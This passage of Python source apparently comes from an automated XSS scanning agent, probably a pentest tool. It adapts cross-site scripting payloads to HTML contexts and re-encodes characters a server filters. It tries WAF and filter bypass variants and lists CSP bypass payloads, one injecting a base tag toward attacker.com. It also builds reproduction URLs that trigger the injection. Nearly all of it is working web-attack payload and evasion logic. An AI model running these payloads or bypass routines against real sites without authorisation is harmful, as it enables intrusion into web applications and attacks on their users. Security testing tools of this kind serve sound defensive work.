        js_code = js_code.replace('<script>', '').replace('</script>', '')
        js_code = js_code.replace('<img src=x onerror=', '').replace('>', '')
        return js_code if js_code else 'alert(1)'

    def _adapt_for_attribute(self, js_code: str) -> str:
        """Adapt for HTML attribute context."""
        return f'" onmouseover="{js_code}" autofocus onfocus="{js_code}" x="'

    def _adapt_for_script(self, js_code: str) -> str:
        """Adapt for script block context."""
        return f"';{js_code};//"

    def _adapt_for_html(self, js_code: str) -> str:
        """Adapt for HTML body context."""
        return f'<img src=x onerror={js_code}>'

    def _adapt_for_comment(self, js_code: str) -> str:
        """Adapt for HTML comment context."""
        return f'--><script>{js_code}</script><!--'

    def _adapt_for_style(self, js_code: str) -> str:
        """Adapt for style block context."""
        return f'</style><script>{js_code}</script><style>'

    def _adapt_to_context(self, payload: str, context: Optional[str]) -> str:
        """
        Adapta un payload al contexto HTML detectado.

        Args:
            payload: Payload original
            context: Contexto detectado ('script', 'attribute', 'html', etc.)

        Returns:
            Payload adaptado al contexto
        """
        js_code = self._extract_js_code(payload)

        if context == 'attribute':
            return self._adapt_for_attribute(js_code)
        if context == 'script':
            return self._adapt_for_script(js_code)
        if context == 'html':
            return self._adapt_for_html(js_code)
        if context == 'comment':
            return self._adapt_for_comment(js_code)
        if context == 'style':
            return self._adapt_for_style(js_code)

        # Default: safe payload
        return self._adapt_for_html(js_code)

    def _encode_stripped_chars(self, payload: str, stripped: List[str]) -> str:
        """
        Codifica los caracteres que fueron filtrados por el servidor.
        
        Args:
            payload: Payload original
            stripped: Lista de caracteres que fueron filtrados
            
        Returns:
            Payload con los caracteres codificados
        """
        result = payload
        
        # Mapeo de caracteres a diferentes encodings
        encoding_options = {
            '<': ['&lt;', '\\x3c', '\\u003c', '%3C'],
            '>': ['&gt;', '\\x3e', '\\u003e', '%3E'],
            '"': ['&quot;', '\\x22', '\\u0022', '%22'],
            "'": ['&#39;', '\\x27', '\\u0027', '%27'],
            '(': ['&#40;', '\\x28', '\\u0028', '%28'],
            ')': ['&#41;', '\\x29', '\\u0029', '%29'],
            '/': ['&#47;', '\\x2f', '\\u002f', '%2F'],
            '\\': ['&#92;', '\\x5c', '\\u005c', '%5C'],
            '=': ['&#61;', '\\x3d', '\\u003d', '%3D']
        }
        
        for char in stripped:
            if char in encoding_options:
                # Usar el primer encoding disponible
                encoded = encoding_options[char][0]
                result = result.replace(char, encoded)
        
        return result

    def _generate_csp_bypass_payload(self) -> str:
        """
        Genera un payload que intenta bypassear CSP.
        
        Returns:
            Payload diseñado para evadir CSP
        """
        csp_bypass_payloads = [
            # Usar 'nonce' si está disponible
            '<script nonce="">alert(1)</script>',
            # Base tag injection
            '<base href="https://attacker.com/">',
            # JSONP callback
            '<script src="/api/callback?cb=alert(1)"></script>',
            # Angular sandbox escape
            '{{constructor.constructor("alert(1)")()}}',
            # Trusted Types bypass
            '<div data-trusted="<img src=x onerror=alert(1)>"></div>',
            # Object/embed bypass
            '<object data="javascript:alert(1)">',
        ]
        # Devolver el primero (en una implementación más avanzada, tendría más lógica)
        return csp_bypass_payloads[0]

    async def generate_bypass_variant(
        self,
        original_payload: str,
        failure_reason: str,
        waf_signature: Optional[str] = None,
        stripped_chars: Optional[str] = None,
        detected_context: Optional[str] = None,
        tried_variants: Optional[List[str]] = None
    ) -> Optional[str]:
        """
        Genera una variante de payload XSS basada en feedback de fallo.
        
        Este método es llamado por el AgenticValidator cuando un payload falla,
        permitiendo al agente usar su lógica sofisticada de bypass para generar
        una variante que evite el problema detectado.
        
        Args:
            original_payload: El payload que falló
            failure_reason: Razón del fallo (waf_blocked, chars_filtered, etc.)
            waf_signature: Firma del WAF detectado (si aplica)
            stripped_chars: Caracteres que fueron filtrados
            detected_context: Contexto HTML donde se reflejó
            tried_variants: Lista de variantes ya probadas
            
        Returns:
            String con el nuevo payload, o None si no se pudo generar
        """
        logger.info(f"[XSSAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
        
        tried_variants = tried_variants or []
        
        # Estrategia 1: Si hay WAF detectado, usar encoding inteligente
        if waf_signature and waf_signature.lower() != "no identificado":
            logger.info(f"[XSSAgent] WAF detected ({waf_signature}), using intelligent encoding...")
            
            # Usar el sistema de Q-Learning para generar variantes optimizadas
            encoded_variants = self._get_waf_optimized_payloads([original_payload], max_variants=5)
            
            # Filtrar las que ya se probaron
            for variant in encoded_variants:
                if variant not in tried_variants and variant != original_payload:
                    logger.info(f"[XSSAgent] Generated WAF bypass variant: {variant[:80]}...")
                    return variant
        
        # Estrategia 2: Si hay caracteres filtrados, usar técnicas de ofuscación
        if stripped_chars:
            logger.info(f"[XSSAgent] Characters filtered ({stripped_chars}), using obfuscation...")
            
            # Técnicas de bypass comunes
            bypass_techniques = []
            
            # Si filtran '<' y '>', probar con event handlers
            if '<' in stripped_chars or '>' in stripped_chars:
                bypass_techniques.extend([
                    f'" autofocus onfocus=alert(1) x="',
                    f'" onload=alert(1) x="',
                    f'" onerror=alert(1) x="',
                ])
            
            # Si filtran 'script', probar alternativas
            if 'script' in stripped_chars.lower():
                bypass_techniques.extend([
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    '<body onload=alert(1)>',
                ])
            
            # Si filtran paréntesis, usar backticks
            if '(' in stripped_chars or ')' in stripped_chars:
                bypass_techniques.extend([
                    '<img src=x onerror=alert`1`>',
                    '<svg onload=alert`1`>',
                ])
            
            for variant in bypass_techniques:
                if variant not in tried_variants:
                    logger.info(f"[XSSAgent] Generated obfuscation variant: {variant[:80]}...")
                    return variant
        
        # Estrategia 3: Si hay contexto detectado, usar payloads específicos
        if detected_context:
            context_lower = detected_context.lower()
            context_specific = []
            
            if 'attribute' in context_lower or 'attr' in context_lower:
                context_specific.extend([
                    '" autofocus onfocus=alert(1) x="',
                    "' autofocus onfocus=alert(1) x='",
                    '" onmouseover=alert(1) x="',
                ])
            elif 'script' in context_lower:
                context_specific.extend([
                    '</script><img src=x onerror=alert(1)>',
                    '-alert(1)-',
                    ';alert(1);//',
                ])
            elif 'html' in context_lower or 'body' in context_lower:
                context_specific.extend([
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    '<iframe onload=alert(1)>',
                ])
            
            for variant in context_specific:
                if variant not in tried_variants:
                    logger.info(f"[XSSAgent] Generated context-specific variant: {variant[:80]}...")
                    return variant
        
        # Estrategia 4: Fallback a payloads universales avanzados
        universal_advanced = [
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
        ]
        
        for variant in universal_advanced:
            if variant not in tried_variants:
                logger.info(f"[XSSAgent] Generated universal variant: {variant[:80]}...")
                return variant
        
        logger.warning("[XSSAgent] Could not generate new variant (all strategies exhausted)")
        return None

    def _finding_to_dict(self, finding: XSSFinding) -> Dict:
        """Convert finding to dictionary for JSON output."""
        # 2026-01-24 FIX: Generate reproduction URL
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        try:
            parsed = urlparse(finding.url)
            qs = parse_qs(parsed.query)
            qs[finding.parameter] = [finding.payload]
            new_query = urlencode(qs, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
            reproduction = f"# Open in browser to trigger XSS:\n{test_url}"
        except Exception:
            reproduction = f"# XSS: Inject payload '{finding.payload}' in parameter '{finding.parameter}'"

        return {
            "type": "XSS",
            "url": finding.url,
            "parameter": finding.parameter,
            "payload": finding.payload,
            "context": finding.context,
            "reflection_context": finding.reflection_context,
            "surviving_chars": finding.surviving_chars,
            "validation_method": finding.validation_method,
            "evidence": finding.evidence,
            "confidence": finding.confidence,
            "screenshot_path": finding.screenshot_path, # Fixed key for WB mapping
            "validated": finding.validated,  # Use authority flag directly
            "status": finding.status,
            "severity": "High",
            "description": f"Reflected XSS confirmed in parameter '{finding.parameter}'. Context: {finding.reflection_context}. Payload executed successfully via {finding.validation_method}.",
            "reproduction": reproduction,
            # NEW FIELDS
            "xss_type": finding.xss_type,
            "injection_context_type": finding.injection_context_type,
            "vulnerable_code_snippet": finding.vulnerable_code_snippet,
            "server_escaping": finding.server_escaping,
            "escape_bypass_technique": finding.escape_bypass_technique,
            "bypass_explanation": finding.bypass_explanation,
            "exploit_url": finding.exploit_url,
            "exploit_url_encoded": finding.exploit_url_encoded,
            "verification_methods": finding.verification_methods,
            "verification_warnings": finding.verification_warnings,
            "reproduction_steps": finding.reproduction_steps
        }


# =============================================================================
# Convenience function
# =============================================================================

async def run_xss_scan(url: str, params: List[str] = None, report_dir: Path = None) -> Dict:
    """Run XSS scan on target URL."""
    agent = XSSAgent(url=url, params=params, report_dir=report_dir)
    return await agent.run()
